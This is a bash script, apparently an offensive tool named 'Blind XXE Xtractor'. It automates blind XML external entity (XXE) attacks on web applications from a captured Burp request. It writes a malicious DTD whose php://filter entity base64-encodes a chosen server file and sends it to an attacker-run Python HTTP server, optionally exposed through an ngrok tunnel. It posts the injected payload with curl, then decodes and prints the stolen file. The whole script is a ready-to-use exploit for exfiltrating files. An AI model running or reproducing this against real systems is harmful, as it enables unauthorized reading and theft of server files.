#!/bin/bash

#Colours by s4vitar
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Random Tool Colour
random_number="$(($RANDOM % 6))"

if [ $random_number -eq 0 ]; then
toolColour=${greenColour}
secondaryColour=${turquoiseColour}
elif [ $random_number -eq 1 ]; then
toolColour=${redColour}
secondaryColour=${grayColour}
elif [ $random_number -eq 2 ]; then
toolColour=${blueColour}
secondaryColour=${greenColour}
elif [ $random_number -eq 3 ]; then
toolColour=${yellowColour}
secondaryColour=${redColour}
elif [ $random_number -eq 4 ]; then
toolColour=${purpleColour}
secondaryColour=${blueColour}
elif [ $random_number -eq 5 ]; then
toolColour=${turquoiseColour}
secondaryColour=${greenColour}
fi

echo -e "
${toolColour} ______  _ _           _    _    _  _    _ _______    _    _                                      
(____  \| (_)         | |  \ \  / /\ \  / (_______)  \ \  / /                     _               
 ____)  ) |_ ____   _ | |   \ \/ /  \ \/ / _____      \ \/ / |_   ____ ____  ____| |_  ___   ____ 
|  __  (| | |  _ \ / || |    )  (    )  ( |  ___)      )  (|  _) / ___) _  |/ ___)  _)/ _ \ / ___)
| |__)  ) | | | | ( (_| |   / /\ \  / /\ \| |_____    / /\ \ |__| |  ( ( | ( (___| |_| |_| | |    
|______/|_|_|_| |_|\____|  /_/  \_\/_/  \_\_______)  /_/  \_\___)_|   \_||_|\____)\___)___/|_|    ${endColour}
                  
                                                                    ${secondaryColour}tool by: sequel &&& kox staff${endColour}
"

function ctrl_c(){
  echo -e "\n${redColour}[+] Exiting...${endColour}\n"
  cleanFiles
  exit 1; tput cnorm
}

trap ctrl_c INT

function xtractXML(){
  tput civis
    ip=$(hostname -I | awk '{print $1}')
  python3 -m http.server $portHttp &>response &
  if [ $publicIP -eq 1 ]; then
  if ngrok &>/dev/null; then
    if $(ngrok http $portHttp &>/dev/null &); then
      sleep 2
      ip=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
      ngrokPID=$(ps aux | grep "ngrok" | grep "$portHttp$" | awk '{print $2}')
    else
      echo -e "${redColour}[!] Ngrok auth token not configured please visit https://ngrok.com/download"
      tput cnorm; exit 1
    fi
  else
    echo -e "${redColour}[!] Ngrok not installed please visit https://ngrok.com/download"
    tput cnorm; exit 1
  fi
  else
    echo "just a test" &>/dev/null
  fi
  

  malicious_dtd="""
  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://$ip:$portHttp/?file=%file;'>\">
  %eval;
  %exfil;"""
  echo -e "\n${toolColour}[+]${endColour}${grayColour} Using the ${toolColour}${xmlFile}${endColour}${grayColour} file to read${endColour} ${secondaryColour}${myFilename}${endColour}${grayColour} on port ${endColour}${toolColour}${portHttp}${endColour}${grayColour}...${endColour}\n"
    echo $malicious_dtd > malicious.dtd
    PID=$(ps aux | grep "python3" | grep "${portHttp}$" | awk '{print $2}')
    sleep 1
    typeHttp=$(cat $xmlFile | grep "http" | head -n 1 | awk '{print $2}' | cut -d '/' -f 1)
    if grep "<?xml" $xmlFile &>/dev/null; then
      curl -s -X POST "$typeHttp//${IPaddr}:${port}${vulnDir}" -d """$(cat $xmlFile | grep -oP "<\?xml..*\?>")<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://$ip:$portHttp/malicious.dtd\"> %xxe;]>$(cat $xmlFile | grep -oP "\?>\K.*")""" &>/dev/null
    elif grep "application/xml" $xmlFile &>/dev/null; then
      curl -s -X POST "$typeHttp//${IPaddr}:${port}${vulnDir}" -d """<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://$ip:$portHttp/malicious.dtd\"> %xxe;]>$(cat $xmlFile | grep -oP "\K<.*")""" &>/dev/null
    fi
    if grep "\?file=" response &>/dev/null; then
      echo -e "${grayColour}♦ Content of ${endColour}${toolColour}$myFilename${endColour}${grayColour} ⤵${endColour}\n\n${secondaryColour}$(cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d)${endColour}"
      cleanFiles
      tput cnorm; exit 0
    else
      echo -e "${redColour}[!] Seems like your extracted Burp's XML request is wrong, the website is not vulnerable or such directory does not exist, exiting...${endColour}"
      cleanFiles
      tput cnorm; exit 1
    fi
}

function helpPanel(){

PC="$(tput setaf $((($RANDOM % 5) + 1)))"
SC="$(tput setaf $((($RANDOM % 5) + 1)))"
NC="$(tput sgr0)"
GC="$(tput setaf 0)"

echo -e "${toolColour}[+]${endColour} ${graColour}Showing help panel...${endColour}"
echo -e "\n${secondaryColour}Examples:${endColour}"
printf "%-2s %-59s %-2s %-2s %-2s %-2s %-2s %-2s\n" ${PC}${0##*/}${NC} ${SC}-g${NC} - Run script in guide mode
printf "%-2s %-2s %-2s %-2s %-30s %-2s %-2s %-2s %-2s %-2s %-2s %-2s\n" ${PC}${0##*/}${NC} ${SC}-b${NC} burpXMLFile ${SC}-f${NC} /etc/hosts - Run script with default port 80
printf "%-2s %-2s %-2s %-2s %-2s %-2s %-16s %-2s %-2s %-2s %-2s %-2s %-2s\n" ${PC}${0##*/}${NC} ${SC}-b${NC} burpXMLFile ${SC}-f${NC} /etc/hosts ${SC}-p${NC} 90 - Run script with port 90
echo -e "\n\n${toolColour}Parameters:${endColour}"
echo -e "\t${secondaryColour}-b${endColour}\t${grayColour}# To specify the Burp's XML request file."
echo -e "\t${secondaryColour}-f${endColour}\t${grayColour}# To specify the directory wanted to read."
echo -e "\t${secondaryColour}-p${endColour}\t${grayColour}# To specify the wanted port to open for the connection (Default port: 80)."
}

function checkIP(){
  # IF MODE GUIDE ON
  if [ $guideAdd -eq 1 ]; then
    while :; do
      echo -ne "${toolColour}[+]${endColour} ${grayColour}Type the extracted Burp's XML request:${endColour} " && read -r xmlFile
      if [ -f "$xmlFile" ]; then
      # If there is a XML format, continue
          if file $xmlFile | grep CRLF &>/dev/null; then
            dos2unix $xmlFile &>/dev/null
          else
            echo 'there is no flag :(' > /dev/null
          fi
          IPaddr="$(cat $xmlFile | awk 'NR==2 {print $2}' | cut -d ':' -f 1)"
          port="$(cat $xmlFile | awk 'NR==2 {print $2}' | cut -d ':' -f 2)"
          if [ "$IPaddr" == "$port" ]; then
            port=80
          else
            port="$(cat $xmlFile | awk 'NR==2 {print $2}' | cut -d ':' -f 2)"
          fi
            vulnDir="$(cat $xmlFile | awk 'NR==1 {print $2}')"
          if ping -c 1 -W 1 $IPaddr &>/dev/null; then
            typeHttp=$(cat $xmlFile | grep "http" | head -n 1 | awk '{print $2}' | cut -d '/' -f 1)
            if [ $typeHttp == "https:" ]; then
            codeHttp=$(curl -s -X GET -I "https://$IPaddr:$port$vulnDir" | head -n 1 | awk '{print $2}')
            else
            codeHttp=$(curl -s -X GET -I "http://$IPaddr:$port$vulnDir" | head -n 1 | awk '{print $2}')
            fi
            if [ $codeHttp -eq 200 ] &>/dev/null; then
              echo -ne "\n${toolColour}[+]${endColour} ${grayColour}Type the wanted file to read (starting with /):${endColour} " && read -r myFilename
              break
            else
              echo -e "\n${redColour}[!] Cannot access web directory. HTTP status code: $codeHttp${endColour}\n"
            fi
          else
            echo -e "\n${redColour}[!] Invalid IP Address${endColour}\n"
          fi
      else
        echo -e "\n${redColour}[!] Not existing file${endColour}\n"
      fi
    done
    # PORT CHECK
    while :; do
      echo -ne "\n${toolColour}[+]${endColour} ${grayColour}Type the wanted port to open for the connection:${endColour} " && read -r portHttp
      if (("$portHttp" >= 1 && "$portHttp" <= 65535)) &>/dev/null; then
        if ! lsof -i:$portHttp | grep "LISTEN" &>/dev/null; then
          if [[ $IPaddr =~ ^localhost|^127.|^10.|^192.168.|^172.(1[6-9]|2[0-9]|3[0-1]). ]]; then
            publicIP=0
            xtractXML $xmlFile $myFilename $portHttp $IPaddr $port $vulnDir $publicIP $typeHttp
          else
            publicIP=1
            xtractXML $xmlFile $myFilename $portHttp $IPaddr $port $vulnDir $publicIP $typeHttp
          fi
        else
          echo -e "\n${redColour}[!] Port ${portHttp} already in use.${endColour}"
        fi
      else
        echo -e "\n${redColour}[!] Chosen port is invalid.${endColour}"
      fi
    done
  else
    if [ -f "$xmlFile" ]; then
  # If there is a XML format, continue
        if file $xmlFile | grep CRLF &>/dev/null; then
          dos2unix $xmlFile &>/dev/null
        else
          echo 'there is no flag :(' > /dev/null
        fi
        IPaddr="$(cat $xmlFile | awk 'NR==2 {print $2}' | cut -d ':' -f 1)"
        port="$(cat $xmlFile | awk 'NR==2 {print $2}' | cut -d ':' -f 2)"
        if [ "$IPaddr" == "$port" ]; then
          port=80
        else
          port="$(cat $xmlFile | awk 'NR==2 {print $2}' | cut -d ':' -f 2)"
        fi
        vulnDir="$(cat $xmlFile | awk 'NR==1 {print $2}')"
        if ping -c 1 -W 1 $IPaddr &>/dev/null; then
          codeHttp=$(curl -s -X GET -I "http://$IPaddr:$port$vulnDir" | head -n 1 | awk '{print $2}')
          if [ "$typeHttp" ==  "https:" ]; then
            codeHttp=$(curl -s -X GET -I "https://$IPaddr:$port$vulnDir" | head -n 1 | awk '{print $2}')
          else
            codeHttp=$(curl -s -X GET -I "http://$IPaddr:$port$vulnDir" | head -n 1 | awk '{print $2}')
          fi
            if ! [ $codeHttp -eq 200 ] &>/dev/null; then
              echo -e "\n${redColour}[!] Cannot access web directory. HTTP status code: $codeHttp${endColour}\n"
            else
            if (("$portHttp" >= 1 && "$portHttp" <= 65535)) &>/dev/null; then
              if ! lsof -i:$portHttp | grep "LISTEN"; then
                if [[ $IPaddr =~ ^localhost|^127.|^10.|^192.168.|^172.(1[6-9]|2[0-9]|3[0-1]). ]]; then
                  publicIP=0
                  xtractXML $xmlFile $myFilename $portHttp $IPaddr $port $vulnDir $publicIP $typeHttp
                else
                  publicIP=1
                  xtractXML $xmlFile $myFilename $portHttp $IPaddr $port $vulnDir $publicIP $typeHttp
                fi
              else
                echo -e "\n${redColour}[!] Port ${portHttp} already in use.${endColour}"
              fi
            else
              echo -e "\n${redColour}[!] Chosen port is invalid.${endColour}"
            fi
          fi
        else
          echo -e "\n${redColour}[!] Invalid IP Address${endColour}\n"
        fi
    else
      echo -e "\n${redColour}[!] Not existing file${endColour}\n"
    fi
  fi
  
}

function cleanFiles(){
  sleep 1
  kill -9 $PID 2>/dev/null
  kill -9 $ngrokPID 2>/dev/null
  wait $PID 2>/dev/null
  rm response 2>/dev/null
  rm malicious.dtd 2>/dev/null
}

declare -i guideAdd=0
declare -i burpAdd=0
declare -i fileAdd=0
declare -i portAdd=0

while getopts "lrghb:f:t:p:" arg; do
  case $arg in
    g) guideAdd=1;;
    b) burpAdd=1; xmlFile="$OPTARG";;
    f) fileAdd=1; myFilename="$OPTARG";;
    p) portAdd=1; portHttp="$OPTARG";;
    h) ;;
  esac
done

if [ $burpAdd -eq 1 ] && [ $fileAdd -eq 1 ] && [ $guideAdd -eq 0 ] && [ $portAdd -eq 0 ]; then
  portHttp=80
  checkIP $xmlFile $myFilename $portHttp $guideAdd
elif [ $burpAdd -eq 1 ] && [ $fileAdd -eq 1 ] && [ $guideAdd -eq 0 ] && [ $portAdd -eq 1 ]; then
  checkIP $xmlFile $myFilename $portHttp $guideAdd
elif [ $guideAdd -eq 1 ]; then
  checkIP $guideAdd
else
  helpPanel
fi
